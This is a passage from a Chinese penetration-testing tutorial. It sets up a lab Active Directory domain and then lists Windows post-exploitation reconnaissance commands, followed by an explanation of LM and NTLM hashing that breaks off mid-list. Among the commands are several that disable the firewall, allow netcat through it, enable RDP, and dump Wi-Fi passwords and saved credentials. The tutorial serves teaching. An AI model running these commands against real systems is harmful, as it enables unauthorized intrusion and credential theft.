<p>在【其他选项】中，等待 <code v-pre>NetBIOS</code> 域名自动生成，保持默认配置即可，点击【下一步】</p>
</blockquote>
<figure><img src="@source/articles/.vuepress/public/images/护网专题/域控主机配置_04_升级域控_04.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>
<blockquote>
<p>在【路径】中，指定 <code v-pre>AD DS</code> 数据库、日志、<code v-pre>SYSVOL</code> 的存储位置，保持默认即可，点击【下一步】</p>
</blockquote>
<blockquote>
<p>在【先决条件检查】中，等待服务器检查，如果失败，按照提示修复，如果成功，则直接点击【下一步】、【安装】</p>
</blockquote>
<figure><img src="@source/articles/.vuepress/public/images/护网专题/域控主机配置_04_升级域控_05.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>
<blockquote>
<p>遇到了一个“失败的先决条件”，修复： 为 <code v-pre>administrator</code> 创建强密码</p>
</blockquote>
<figure><img src="@source/articles/.vuepress/public/images/护网专题/域控主机配置_04_升级域控_06.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>
<blockquote>
<p>回到【域服务配置向导】，点击上方的蓝色字体【重新运行先决条件检查】，检查通过，点击【安装】</p>
</blockquote>
<figure><img src="@source/articles/.vuepress/public/images/护网专题/域控主机配置_04_升级域控_07.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>
<blockquote>
<p>安装完成后，会自动重启</p>
</blockquote>
<figure><img src="@source/articles/.vuepress/public/images/护网专题/域控主机配置_04_升级域控_08.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>
<h5 id="五、创建-active-directory-用户" tabindex="-1"><a class="header-anchor" href="#五、创建-active-directory-用户" aria-hidden="true">#</a> 五、创建 Active Directory 用户</h5>
<blockquote>
<p>在【控制面板】【系统和安全】【管理工具】中，双击打开【Active Directory 用户和计算机】，展开【<code v-pre>hack.com</code>】，选中【<code v-pre>User</code>】并点击鼠标右键打开菜单，选择【新建】【用户】，</p>
</blockquote>
<h4 id="域内加入主机" tabindex="-1"><a class="header-anchor" href="#域内加入主机" aria-hidden="true">#</a> 域内加入主机</h4>
<blockquote>
<p>以 <code v-pre>Windows Server 2008 R2 x64</code> 虚拟机为例</p>
</blockquote>
<h5 id="一、配置网络" tabindex="-1"><a class="header-anchor" href="#一、配置网络" aria-hidden="true">#</a> 一、配置网络</h5>
<ul>
<li>静态IP地址：192.168.136.20</li>
<li>子网掩码：255.255.255.0</li>
<li>网关： 192.168.136.2 （默认网关）</li>
<li>DNS： 192.168.136.10（指向域控主机）</li>
</ul>
<h5 id="二、ping-域控-保证通信正常" tabindex="-1"><a class="header-anchor" href="#二、ping-域控-保证通信正常" aria-hidden="true">#</a> 二、Ping 域控，保证通信正常</h5>
<h5 id="三、将主机加入域" tabindex="-1"><a class="header-anchor" href="#三、将主机加入域" aria-hidden="true">#</a> 三、将主机加入域</h5>
<blockquote>
<p>在【计算机名】中修改【域名】为 <code v-pre>hack.com</code>，点击【确定】，按照要求输入【域管理员账号和密码】</p>
</blockquote>
<figure><img src="@source/articles/.vuepress/public/images/护网专题/域内加入主机_06_配置网络_02.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>
<blockquote>
<p>加域成功，按要求重启计算机生效。重启之后的域账户需要修改密码（原始密码默认为空）</p>
</blockquote>
<figure><img src="@source/articles/.vuepress/public/images/护网专题/域内加入主机_06_配置网络_03.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>
<h3 id="本机工作组信息收集" tabindex="-1"><a class="header-anchor" href="#本机工作组信息收集" aria-hidden="true">#</a> 本机工作组信息收集</h3>
<h4 id="网络配置信息" tabindex="-1"><a class="header-anchor" href="#网络配置信息" aria-hidden="true">#</a> 网络配置信息</h4>
<p>查看网络配置信息</p>
<blockquote>
<p><code v-pre>ipconfig</code></p>
</blockquote>
<h4 id="操作系统和软件信息" tabindex="-1"><a class="header-anchor" href="#操作系统和软件信息" aria-hidden="true">#</a> 操作系统和软件信息</h4>
<p>查看系统信息</p>
<blockquote>
<p><code v-pre>systeminfo</code></p>
</blockquote>
<p>查看系统名称和版本</p>
<blockquote>
<p><code v-pre>systeminfo | findstr /B /C:&quot;OS Name&quot;/C:&quot;OS Version&quot;</code></p>
</blockquote>
<p>查看系统体系结构（32位/64位）</p>
<blockquote>
<p><code v-pre>echo %PROCESSOR_ARCHITECTURE%</code></p>
</blockquote>
<p>查看安装的软件及版本</p>
<blockquote>
<p><code v-pre>wmic product get name, version</code></p>
</blockquote>
<h4 id="本机服务信息" tabindex="-1"><a class="header-anchor" href="#本机服务信息" aria-hidden="true">#</a> 本机服务信息</h4>
<p>查看服务列表简述</p>
<blockquote>
<p><code v-pre>wmic service list brief</code></p>
</blockquote>
<h4 id="进程信息" tabindex="-1"><a class="header-anchor" href="#进程信息" aria-hidden="true">#</a> 进程信息</h4>
<p>查看进程列表</p>
<blockquote>
<p><code v-pre>tasklist</code></p>
</blockquote>
<p>或</p>
<blockquote>
<p><code v-pre>wmic process list brief</code></p>
</blockquote>
<h4 id="启动程序信息" tabindex="-1"><a class="header-anchor" href="#启动程序信息" aria-hidden="true">#</a> 启动程序信息</h4>
<p>查看自启程序</p>
<blockquote>
<p><code v-pre>wmic startup command, caption</code></p>
</blockquote>
<h4 id="计划任务信息" tabindex="-1"><a class="header-anchor" href="#计划任务信息" aria-hidden="true">#</a> 计划任务信息</h4>
<p>查看计划任务列表（如果出现“无法载入列资源”，输入： <code v-pre>chcp 437</code> 更改编码）</p>
<p><code v-pre>schtasks /query /fo LIST /v</code></p>
<h4 id="主机开机时间信息" tabindex="-1"><a class="header-anchor" href="#主机开机时间信息" aria-hidden="true">#</a> 主机开机时间信息</h4>
<p>查看开机时间</p>
<blockquote>
<p><code v-pre>net statistics workstation</code></p>
</blockquote>
<h4 id="用户列表信息" tabindex="-1"><a class="header-anchor" href="#用户列表信息" aria-hidden="true">#</a> 用户列表信息</h4>
<p>查看用户列表</p>
<blockquote>
<p><code v-pre>net user</code></p>
</blockquote>
<p>或</p>
<blockquote>
<p><code v-pre>wmic useraccount get name, SID</code></p>
</blockquote>
<h4 id="列出回话" tabindex="-1"><a class="header-anchor" href="#列出回话" aria-hidden="true">#</a> 列出回话</h4>
<p>会话列表</p>
<blockquote>
<p><code v-pre>net session</code></p>
</blockquote>
<h4 id="查询端口列表" tabindex="-1"><a class="header-anchor" href="#查询端口列表" aria-hidden="true">#</a> 查询端口列表</h4>
<p>查看端口</p>
<blockquote>
<p><code v-pre>netstat -ano</code></p>
</blockquote>
<h4 id="查询补丁列表" tabindex="-1"><a class="header-anchor" href="#查询补丁列表" aria-hidden="true">#</a> 查询补丁列表</h4>
<p>查看系统信息（包含补丁列表）</p>
<blockquote>
<p><code v-pre>systeminfo</code></p>
</blockquote>
<p>查看补丁列表</p>
<blockquote>
<p><code v-pre>wmic qfe get Caption, Description, HotFixID, InstalledOn</code></p>
</blockquote>
<h4 id="查询共享列表" tabindex="-1"><a class="header-anchor" href="#查询共享列表" aria-hidden="true">#</a> 查询共享列表</h4>
<p>查看共享列表</p>
<blockquote>
<p><code v-pre>net share</code></p>
</blockquote>
<p>或</p>
<blockquote>
<p><code v-pre>wmic share get name, path, status</code></p>
</blockquote>
<h4 id="路由信息" tabindex="-1"><a class="header-anchor" href="#路由信息" aria-hidden="true">#</a> 路由信息</h4>
<p>查看路由信息</p>
<blockquote>
<p><code v-pre>route print </code></p>
</blockquote>
<h4 id="防火墙相关操作" tabindex="-1"><a class="header-anchor" href="#防火墙相关操作" aria-hidden="true">#</a> 防火墙相关操作</h4>
<p>查看防火墙状态</p>
<blockquote>
<p><code v-pre>netsh firewall show state</code></p>
</blockquote>
<p>关闭防火墙</p>
<blockquote>
<p><code v-pre>netsh firewall set opmode disable</code></p>
<p><code v-pre>netsh advfirewall set allprofiles state off</code>  （<code v-pre>Windows Server 2003</code> 之后）</p>
</blockquote>
<p>查看防火墙配置</p>
<blockquote>
<p><code v-pre>netsh firewall config</code></p>
</blockquote>
<p>修改防火墙配置，允许指定程序进行全部连接</p>
<blockquote>
<p><code v-pre>netsh firewall add alloweprogram C:\nc.exe &quot;allownc&quot; enable</code>	（<code v-pre>Windows Server 2003</code> 之前）</p>
<p><code v-pre>netsh advfirewall firewall add rule name=&quot;passnc&quot; dir=in action=allow program=&quot;C:\nc.exe&quot;</code>	（<code v-pre>Windows Server 2003</code> 之后）</p>
</blockquote>
<p>修改防火墙配置，允许指定程序退出</p>
<blockquote>
<p><code v-pre>netsh advfirewall firewall add rule name=&quot;exitnc&quot; dir=out action=allow program=&quot;C:\nc.exe&quot;</code></p>
</blockquote>
<p>修改防火墙配置，允许 <code v-pre>3389</code> 端口放行</p>
<blockquote>
<p><code v-pre>netsh advfirewall firewall add rule name=&quot;remoteDesktop&quot; protocol=TCP dir=in localport=3389 action=allow</code></p>
</blockquote>
<h4 id="开启远程服务" tabindex="-1"><a class="header-anchor" href="#开启远程服务" aria-hidden="true">#</a> 开启远程服务</h4>
<p>开启远程服务（<code v-pre>Windows Server 2003</code> ）</p>
<blockquote>
<p><code v-pre>wmic path win32_terminalservicesetting where (_CLASS != &quot;&quot;) call setallowtsconnections 1</code></p>
</blockquote>
<p>开启远程服务（<code v-pre>Windows Server 2003</code> 之后）</p>
<p><code v-pre>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code></p>
<p>关闭远程服务（<code v-pre>Windows Server 2003</code> 之后）</p>
<blockquote>
<p><code v-pre>REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnection /t REG_DWORD /d 11111111 /f</code></p>
</blockquote>
<h4 id="wifi-密码收集" tabindex="-1"><a class="header-anchor" href="#wifi-密码收集" aria-hidden="true">#</a> Wifi 密码收集</h4>
<p>获取 <code v-pre>Wifi</code> 密码</p>
<blockquote>
<p><code v-pre>for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key= clear</code></p>
</blockquote>
<h4 id="查询-rdp-端口" tabindex="-1"><a class="header-anchor" href="#查询-rdp-端口" aria-hidden="true">#</a> 查询 RDP 端口</h4>
<p>查看 <code v-pre>RDP（远程桌面协议）</code> 的端口（应对某些修改了远程协议默认端口的场景。默认是 <code v-pre>3389</code>，对应十六进制 <code v-pre>0xd3d</code>）</p>
<blockquote>
<p><code v-pre>reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp&quot; /V PortNumber</code></p>
</blockquote>
<h4 id="查询-rdp-凭证" tabindex="-1"><a class="header-anchor" href="#查询-rdp-凭证" aria-hidden="true">#</a> 查询 RDP 凭证</h4>
<blockquote>
<p>查询 <code v-pre>RDP</code> 存活凭证（连接远程主机时如果选择了【保存密码】，就会生成一个凭证）</p>
</blockquote>
<blockquote>
<p><code v-pre>dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*</code></p>
</blockquote>
<h4 id="查看代理配置信息" tabindex="-1"><a class="header-anchor" href="#查看代理配置信息" aria-hidden="true">#</a> 查看代理配置信息</h4>
<p>查看代理配置信息</p>
<blockquote>
<p><code v-pre>reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</code></p>
</blockquote>
<h4 id="查看当前保存的登录凭证" tabindex="-1"><a class="header-anchor" href="#查看当前保存的登录凭证" aria-hidden="true">#</a> 查看当前保存的登录凭证</h4>
<p>查看当前保存的登录凭证</p>
<blockquote>
<p><code v-pre>cmdkey /l</code></p>
</blockquote>
<h4 id="arp-信息" tabindex="-1"><a class="header-anchor" href="#arp-信息" aria-hidden="true">#</a> ARP 信息</h4>
<p>查看 <code v-pre>ARP</code> 信息</p>
<blockquote>
<p><code v-pre>arp -a</code></p>
</blockquote>
<h4 id="查看最近打开的文档" tabindex="-1"><a class="header-anchor" href="#查看最近打开的文档" aria-hidden="true">#</a> 查看最近打开的文档</h4>
<p>查看最近打开的文档</p>
<blockquote>
<p><code v-pre>dir %APPDATA%\Microsoft\Windows\Recent</code></p>
</blockquote>
<h4 id="查询本机用户组" tabindex="-1"><a class="header-anchor" href="#查询本机用户组" aria-hidden="true">#</a> 查询本机用户组</h4>
<p>查询本机用户组</p>
<blockquote>
<p><code v-pre>net localgroup</code></p>
</blockquote>
<h4 id="管理员组成员列表" tabindex="-1"><a class="header-anchor" href="#管理员组成员列表" aria-hidden="true">#</a> 管理员组成员列表</h4>
<p>查询管理员组的成员列表（域管理员账号就是本机（域内主机）的 <code v-pre>administrator</code> 管理员组中的一个账号）</p>
<blockquote>
<p><code v-pre>net localgroup administrators</code></p>
</blockquote>
<h4 id="浏览器密码获取" tabindex="-1"><a class="header-anchor" href="#浏览器密码获取" aria-hidden="true">#</a> 浏览器密码获取</h4>
<p>浏览器密码获取</p>
<blockquote>
<p>``</p>
</blockquote>
<h4 id="杀软查询" tabindex="-1"><a class="header-anchor" href="#杀软查询" aria-hidden="true">#</a> 杀软查询</h4>
<p>查看安装的杀毒软件</p>
<blockquote>
<p><code v-pre>wmic /node:localhost /namespace:\\root\securitycenter2 path antivirusproduct get displayname /format:list </code></p>
</blockquote>
<h3 id="域内信息收集" tabindex="-1"><a class="header-anchor" href="#域内信息收集" aria-hidden="true">#</a> 域内信息收集</h3>
<h4 id="查询系统权限" tabindex="-1"><a class="header-anchor" href="#查询系统权限" aria-hidden="true">#</a> 查询系统权限</h4>
<p><code v-pre>whoami</code></p>
<p>以下以本地计算机名为 <code v-pre>PC-2008</code>，域名为 <code v-pre>hack.com</code> 为例</p>
<ol>
<li>
<p>本地普通用户</p>
<p><code v-pre>pc-2008\bob</code></p>
</li>
<li>
<p>本地管理员</p>
<p><code v-pre>pc-2008\administrator</code></p>
</li>
<li>
<p>域内普通用户</p>
<p><code v-pre>hack\bob</code></p>
</li>
<li>
<p>域管理员</p>
<p><code v-pre>hack\administrator</code></p>
</li>
</ol>
<ul>
<li>
<p>如果当前内网中存在域</p>
<ul>
<li><strong>本地普通账户</strong>只能查询本机相关信息，不能查询域内信息</li>
<li><strong>本地管理员用户</strong>和<strong>域内用户</strong>可以查询域内信息</li>
</ul>
<blockquote>
<p>原因： 域内所有查询都是通过域控制器基于 <code v-pre>LDAP</code> 协议实现的，这个查询需要权限认证。所以只有域内用户才拥有这个权限，当域内用户在本地机器上执行查询命令时，会自动使用 <code v-pre>Kerberos</code> 协议进行认证，无须额外的账号密码。</p>
</blockquote>
</li>
<li>
<p>本地管理员 <code v-pre>Administrator</code> 权限可以直接提升为 <code v-pre>Ntauthority</code> 或 <code v-pre>System</code>。 因此，在域中，除了普通用户外，所以的机器都有一个机器用户（名称为： <code v-pre>机器名$</code>）。在本质上，每台机器中的 <code v-pre>system</code> 用户对应的就是域里面名为<code v-pre>机器名$</code> 的机器用户，所以使用 <code v-pre>system</code> 权限是可以运行域内的查询命令的。</p>
</li>
<li>
<p>简单概括： <strong>本地的 <code v-pre>Administrator</code> 无权执行域内命令，但可以直接提升为 <code v-pre>System</code> ，而 <code v-pre>System</code> 有权执行域内命令。</strong></p>
</li>
</ul>
<h4 id="判断域的存在" tabindex="-1"><a class="header-anchor" href="#判断域的存在" aria-hidden="true">#</a> 判断域的存在</h4>
<p><strong>方法一： <code v-pre>ipconfig /all</code></strong></p>
<p>查看网关 IP 地址、DNS 地址、域名。</p>
<p>通过反向解析命令 <code v-pre>nslookup</code> 解析域名的 IP 地址，判断本机是否和 DNS 服务器在同一网段同一服务器上。</p>
<p><strong>方法二： <code v-pre>systeminfo</code></strong></p>
<p>查看【域】或者【Domain】对应的内容</p>
<p><strong>方法三： <code v-pre>net config workstation</code></strong></p>
<h4 id="查询域内基础信息" tabindex="-1"><a class="header-anchor" href="#查询域内基础信息" aria-hidden="true">#</a> 查询域内基础信息</h4>
<h5 id="查询域" tabindex="-1"><a class="header-anchor" href="#查询域" aria-hidden="true">#</a> 查询域</h5>
<p>前提： 开启 <code v-pre>Workstation</code> 和 <code v-pre>Computer Browser</code> 服务，防火墙处于关闭</p>
<blockquote>
<p><code v-pre>net view /domain</code></p>
</blockquote>
<h5 id="查询域内所有计算机" tabindex="-1"><a class="header-anchor" href="#查询域内所有计算机" aria-hidden="true">#</a> 查询域内所有计算机</h5>
<blockquote>
<p><code v-pre>net view /domain:hack</code></p>
</blockquote>
<h5 id="查询域内所有用户组" tabindex="-1"><a class="header-anchor" href="#查询域内所有用户组" aria-hidden="true">#</a> 查询域内所有用户组</h5>
<blockquote>
<p><code v-pre>net group /domain</code></p>
</blockquote>
<blockquote>
<p>常见的自带身份：</p>
<ul>
<li><code v-pre>Domain Admin</code>s： 域管理员（默认拥有域控制器的完全控制权）</li>
<li><code v-pre>Domain Computers</code>： 域内机器</li>
<li><code v-pre>Domain Controller</code>： 域控制器</li>
<li><code v-pre>Domain Guests</code>： 域访客</li>
<li><code v-pre>Domain Users</code>： 域用户</li>
<li><code v-pre>Enterprise Admins</code> 企业级系统管理员（默认拥有域控制器的完全控制权）</li>
</ul>
</blockquote>
<h5 id="查询域内所有成员计算机" tabindex="-1"><a class="header-anchor" href="#查询域内所有成员计算机" aria-hidden="true">#</a> 查询域内所有成员计算机</h5>
<blockquote>
<p><code v-pre>net group &quot;domain computers&quot; /domain</code></p>
</blockquote>
<h5 id="获取域密码信息" tabindex="-1"><a class="header-anchor" href="#获取域密码信息" aria-hidden="true">#</a> 获取域密码信息</h5>
<p>获取域密码策略、长度、错误锁定、过期时间等信息</p>
<blockquote>
<p><code v-pre>net accounts /domain</code></p>
</blockquote>
<h5 id="获取域信任信息" tabindex="-1"><a class="header-anchor" href="#获取域信任信息" aria-hidden="true">#</a> 获取域信任信息</h5>
<p>如果存在域信任关系，可以进行跨域操作</p>
<blockquote>
<p><code v-pre>nltest /domain_trusts</code></p>
</blockquote>
<h4 id="查找域控主机" tabindex="-1"><a class="header-anchor" href="#查找域控主机" aria-hidden="true">#</a> 查找域控主机</h4>
<p><strong>方法一： 查看域控制器的机器名</strong></p>
<blockquote>
<p><code v-pre>nltest /DCLIST:hack</code></p>
</blockquote>
<p><strong>方法二： 查看域控制器的主机名</strong></p>
<blockquote>
<p><code v-pre>nslookup -type=SRV _ldap._tcp</code></p>
</blockquote>
<p><strong>方法三： 查看当前时间</strong></p>
<p>通常情况下，时间服务器会作为主域控制器</p>
<blockquote>
<p><code v-pre>net time /domain</code></p>
</blockquote>
<p><strong>方法四： 查看域控制器组</strong></p>
<blockquote>
<p><code v-pre>net group &quot;Domain Controllers&quot; /domain</code></p>
</blockquote>
<h4 id="获取域内用户" tabindex="-1"><a class="header-anchor" href="#获取域内用户" aria-hidden="true">#</a> 获取域内用户</h4>
<p><strong>方法一： 向域控制器进行查询</strong></p>
<blockquote>
<p><code v-pre>net user /domain</code></p>
</blockquote>
<p><strong>方法二： 获取域内用户的详细列表</strong></p>
<blockquote>
<p><code v-pre>wmic useraccount get/all</code></p>
</blockquote>
<p><strong>方法三： 查看存在的用户</strong></p>
<blockquote>
<p><code v-pre>dsquery user</code></p>
</blockquote>
<p><strong>方法四： 查询本地管理员组用户</strong></p>
<blockquote>
<p><code v-pre>net localgroup administrator</code></p>
</blockquote>
<h4 id="查找域管理员" tabindex="-1"><a class="header-anchor" href="#查找域管理员" aria-hidden="true">#</a> 查找域管理员</h4>
<blockquote>
<p><code v-pre>net group &quot;domain admins&quot; /domain</code></p>
</blockquote>
<h4 id="查找域管理进程" tabindex="-1"><a class="header-anchor" href="#查找域管理进程" aria-hidden="true">#</a> 查找域管理进程</h4>
<h2 id="内网扫描" tabindex="-1"><a class="header-anchor" href="#内网扫描" aria-hidden="true">#</a> 内网扫描</h2>
<h3 id="主机探测" tabindex="-1"><a class="header-anchor" href="#主机探测" aria-hidden="true">#</a> 主机探测</h3>
<h4 id="netbios-扫描" tabindex="-1"><a class="header-anchor" href="#netbios-扫描" aria-hidden="true">#</a> NetBIOS 扫描</h4>
<blockquote>
<p><code v-pre>NetBIOS</code> 是一款用于扫描 <code v-pre>Windows</code> 网络上 <code v-pre>NetBIOS</code> 名称信息的程序。该程序对给出范围内的每一个地址发送 <code v-pre>NetBIOS</code> 状态查询，并且以易读的表格列出接收到的信息，对于每个响应的主机，<code v-pre>NBTScan</code> 列出它的 <code v-pre>IP</code> 地址、<code v-pre>NetBIOS</code> 计算机名、登录用户名和 <code v-pre>MAC</code> 地址，但仅限于局域网。<code v-pre>NBTSCAN</code> 可以获取到 <code v-pre>PC</code> 的真实 <code v-pre>IP</code> 地址和 <code v-pre>MAC</code> 地址，如果有 <code v-pre>ARP</code> 攻击存在，可以找到装有 <code v-pre>ARP</code> 攻击的 <code v-pre>PC</code> 的 <code v-pre>IP</code> 和 <code v-pre>MAC</code>，同样也仅限于局域网。</p>
</blockquote>
<p>下载地址： <code v-pre>http://www.unixwiz.net/tools/nbtscan.html</code></p>
<p>用法： <code v-pre>nbtscan.exe ip</code></p>
<h4 id="icmp-探测" tabindex="-1"><a class="header-anchor" href="#icmp-探测" aria-hidden="true">#</a> ICMP 探测</h4>
<blockquote>
<p>除了利用 <code v-pre>NetBIOS</code> 探测之外，也可以利用 <code v-pre>ICMP</code> 协议探测内网，依次对内网中的每个 <code v-pre>IP</code> 地址进行 <code v-pre>ping</code>，快速的找到内网中所有存活主机</p>
</blockquote>
<p>探测整个 <code v-pre>C</code> 段： <code v-pre>for /L %I in (1, 1, 254) Do @ping -w 1 -n 1 192.168.1.%I | findstr &quot;TTL=&quot;</code></p>
<h4 id="arp-扫描工具探测" tabindex="-1"><a class="header-anchor" href="#arp-扫描工具探测" aria-hidden="true">#</a> ARP 扫描工具探测</h4>
<p><code v-pre>arp -t ip</code></p>
<h4 id="端口探测" tabindex="-1"><a class="header-anchor" href="#端口探测" aria-hidden="true">#</a> 端口探测</h4>
<blockquote>
<p>通过查询目标主机的端口开放信息，不进可以了解目标主机所开放的服务，还可以找出其开放服务的漏洞，分析目标网络的拓扑结构等。</p>
<p>在进行内网渗透时，通常会使用 <code v-pre>metasploit</code> 内置的端口扫描。也可以上传端口扫描工具，使用工具进行扫描，还可以根据服务器的环境，使用自定义的端口扫描脚本进行扫描。在获得授权的情况下，也可以直接用 <code v-pre>nmap</code>、 <code v-pre>masscan</code> 之类的端口扫描工具。</p>
</blockquote>
<h4 id="scanline" tabindex="-1"><a class="header-anchor" href="#scanline" aria-hidden="true">#</a> ScanLine</h4>
<blockquote>
<p><code v-pre>ScanLine</code> 是一款 <code v-pre>windows</code> 下的端口扫描命令程序，它可以完成 <code v-pre>ping</code> 扫描、 <code v-pre>tcp</code> 端口扫描、 <code v-pre>udp</code> 端口扫描等功能。 运行速度快，不需要 <code v-pre>winPcap</code> 库支持，应用场合受限较少。</p>
</blockquote>
<p><code v-pre>scanline.exe -bhpt 21-23,25,80,110,135-139,143,443,445,1433,1521,3306,2289,5556,5631,5900,8080 192.168.xxx.xxx</code></p>
<p><code v-pre>scanline.exe -bhpt 80,443 192.168.0.1-254</code></p>
<h4 id="telnet" tabindex="-1"><a class="header-anchor" href="#telnet" aria-hidden="true">#</a> Telnet</h4>
<blockquote>
<p><code v-pre>Telnet</code> 协议是 <code v-pre>TCP/IP</code> 协议簇的一员，是 <code v-pre>Internet</code> 远程登录访问的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。在目标计算机上使用 <code v-pre>Telnet</code> 协议，可以与目标服务器建立连接。如果只是想快速探测某台主机的某个常规高危端口是否开放，使用 <code v-pre>telnet</code> 命令是最方便的。</p>
</blockquote>
<p><code v-pre>telnet IP PORT</code></p>
<h2 id="lm-和-ntml-哈希" tabindex="-1"><a class="header-anchor" href="#lm-和-ntml-哈希" aria-hidden="true">#</a> LM 和 NTML 哈希</h2>
<h3 id="哈希介绍" tabindex="-1"><a class="header-anchor" href="#哈希介绍" aria-hidden="true">#</a> 哈希介绍</h3>
<blockquote>
<p><code v-pre>Windows</code> 操作系统通常使用两种方式对用户的明文密码进行加密处理。在域环境中，用户信息存储在 <code v-pre>ntds.dit</code> 中，加密后为散列值。</p>
<p><code v-pre>Windows</code> 操作系统中的密码一般由两部分组成： 一部分为 <code v-pre>LM Hash</code>， 另一部分为 <code v-pre>NTML Hash</code>。</p>
</blockquote>
<blockquote>
<p><code v-pre>Windows</code> 操作系统中，<code v-pre>Hash</code> 的结构通常如下：</p>
<p><code v-pre>username:RID:LM-HASH:NT-HASH</code></p>
</blockquote>
<blockquote>
<p><code v-pre>LM Hash</code> 全称： <code v-pre>Lan Manager Hash</code>。 是微软为了提高 <code v-pre>Windows</code> 操作系统的安全性而采用的散列加密算法，其本质上是 <code v-pre>DES</code> 加密。</p>
<p>后来，由于 <code v-pre>DES</code> 被认定为不安全算法，<code v-pre>LM Hash</code> 也变得比较容易破解，但是为了保证系统的兼容性，<code v-pre>Windows</code> 只是禁用了 <code v-pre>LM Hash</code> （从 <code v-pre>Windows Vista</code> 和 <code v-pre>Windows Server 2008</code> 开始，默认禁用 <code v-pre>LM Hash</code>）。 <code v-pre>LM Hash</code> 明文密码被限定在 <code v-pre>14</code> 位以内，也就是说，如果要停止使用 <code v-pre>LM Hash</code>， 只需要将密码设置为 <code v-pre>14</code> 位以上即可。</p>
</blockquote>
<blockquote>
<p>攻击者通过工具抓取到的 <code v-pre>LM Hash</code> 如果为 <code v-pre>ad3b435b51404eead3b435b51404ee</code>，通常表示 <code v-pre>LM Hash</code> 为空值或者被禁用</p>
</blockquote>
<blockquote>
<p><code v-pre>NTLM Hash</code> 是微软为了在提高安全性的同时保证兼容性而设计的散列加密算法。 <code v-pre>NTLM Hash</code> 是基于 <code v-pre>MD4</code> 加密算法进行加密的。从 <code v-pre>Windows Vista</code> 和 <code v-pre>Windows Server 2003</code> 以后， <code v-pre>Windows</code> 操作系统的认证方式均为 <code v-pre>NTML Hash</code>）</p>
</blockquote>
<h3 id="lm-hash-原理" tabindex="-1"><a class="header-anchor" href="#lm-hash-原理" aria-hidden="true">#</a> LM Hash 原理</h3>
<p>假设明文口令为 <code v-pre>Admin@123</code></p>
<ol>
<li>
<p>将明文口令转换成大写形式。</p>
<p><code v-pre>ADMIN@123</code></p>
</li>
<li>
<p>将大写字符串转换为 <code v-pre>16</code> 进制字符串</p>
<p>十进制： <code v-pre>65 68 77 73 78 64 49 50 51</code></p>
<p>十六进制： <code v-pre>41 44 4D 49 4E 40 31 32 33</code></p>
</li>
<li>
<p>不足 <code v-pre>14</code> 字节的用 <code v-pre>0</code> 补全</p>
<p><code v-pre>41 44 4D 49 4E 40 31 32 33 00 00 00 00 00</code></p>
</li>
<li>
<p>拆分成 <code v-pre>2</code> 个 <code v-pre>7</code> 组</p>
<p>第一组： <code v-pre>41 44 4D 49 4E 40 31</code></p>
<p>第二组： <code v-pre>32 33 00 00 00 00 00</code></p>
</li>
<li>
<p>将每组 <code v-pre>7</code> 字节的十六进制转成二进制</p>
<p>第一组： <code v-pre>0100 0001 0100 0100 0100 1101 0100 1001 0100 1110 0100 0000 0011 0001</code></p>
<p>第二组： <code v-pre>0011 0010 0011 0011 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000</code></p>
</li>
<li>
<p>每组每 <code v-pre>7bit</code> 一组，末尾加 <code v-pre>0</code> 补全</p>
<p>第一组：</p>
<p><code v-pre>0100 000</code> <code v-pre>0</code></p>
<p><code v-pre>1010 001</code> <code v-pre>0</code></p>
<p><code v-pre>0001 001</code> <code v-pre>0</code></p>
<p><code v-pre>1010 100</code> <code v-pre>0</code></p>
<p><code v-pre>1001 010</code> <code v-pre> 0</code></p>
<p><code v-pre>0111 001</code> <code v-pre>0</code></p>
<p><code v-pre>0000 000</code> <code v-pre>0</code></p>
<p><code v-pre>0110 001</code> <code v-pre>0</code></p>
<p>第二组：</p>
<p><code v-pre>0011 001</code> <code v-pre>0</code></p>
<p><code v-pre>0001 100</code> <code v-pre>0</code></p>
<p><code v-pre>1100 000</code> <code v-pre>0</code></p>
<p><code v-pre>0000 000</code> <code v-pre>0</code></p>
<p><code v-pre>0000 000</code> <code v-pre>0</code></p>
<p><code v-pre>0000 000</code> <code v-pre>0</code></p>
<p><code v-pre>0000 000</code> <code v-pre>0</code></p>
<p><code v-pre>0000 000</code> <code v-pre>0</code></p>
</li>
<li>
<p>再转换为十六进制得到 <code v-pre>2</code> 组 <code v-pre>8</code> 字节的编码</p>
<p>第一组： <code v-pre>40 A2 12 A8 94 72 00 62</code></p>
<p>第二组： <code v-pre>32 18 C0 00 00 00 00 00</code></p>
</li>
<li>
<p>将以上 <code v-pre>2</code> 组 <code v-pre>8</code> 字节编码分别作为 <code v-pre>key</code> 对固定字符串 <code v-pre>KGS!@#$%</code> 进行 <code v-pre>DES</code> 加密（固定字符串，也是可以破解的本质原因）</p>
<p><code v-pre>KGS!@#$%</code> 的 <code v-pre>16</code> 进制为 <code v-pre>4B 47 53 21 40 23 24 25</code></p>
<p><code v-pre>DES</code> 加密：</p>
<p>第一组： <code v-pre>6F 08 F7 B3 06 B1 DA D4</code></p>
<p>第二组： <code v-pre>B7 5E 0C 8D 76 95 4A 50</code></p>
</li>
<li>
<p>拼接得到最终的密文</p>
<p><code v-pre>6F08F7B306B1DAD4B75E0C8D76954A50</code></p>
</li>
</ol>
<h3 id="ntlm-hash-原理" tabindex="-1"><a class="header-anchor" href="#ntlm-hash-原理" aria-hidden="true">#</a> NTLM Hash 原理</h3>
<p>假设明文口令为 <code v-pre>Admin@123</code></p>
<ol>
<li>
<p>转换成 <code v-pre>16</code> 进制</p>
<p><code v-pre>41 64 6D 69 6E 40 31 32 33</code></p>
</li>
<li>
